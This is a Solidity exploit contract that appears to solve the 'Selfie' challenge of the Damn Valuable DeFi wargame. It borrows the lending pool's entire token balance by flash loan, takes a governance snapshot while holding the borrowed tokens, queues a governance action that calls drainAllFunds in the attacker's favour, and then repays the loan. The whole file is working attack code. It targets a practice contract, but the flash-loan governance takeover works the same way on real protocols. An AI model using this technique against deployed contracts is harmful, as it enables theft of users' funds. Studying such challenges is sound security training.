// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract Attacker {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public selfiePool;
    address attacker;
    constructor(address _attacker, address tokenAddress, address governanceAddress, address selfiePoolAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        selfiePool = SelfiePool(selfiePoolAddress);
        attacker = _attacker;
    }

    function attack() external {
        // FlashLoan
        uint amount = token.balanceOf(address(selfiePool));
        selfiePool.flashLoan(amount);
        // take control of governance - See receive
        // queue a tx to withdraw all funds - See receive
        // repay the loan - see receive
        // cast the tx
    }

    function receiveTokens(address _token, uint borrow_amount) public {
        console.log(borrow_amount);
        token.snapshot();
        bytes memory data = abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, attacker);
        uint weiAmount = 0;
        governance.queueAction(address(selfiePool), data, weiAmount);
        token.transfer(address(selfiePool), borrow_amount);
        console.log(token.balanceOf(address(this)));
    }
}
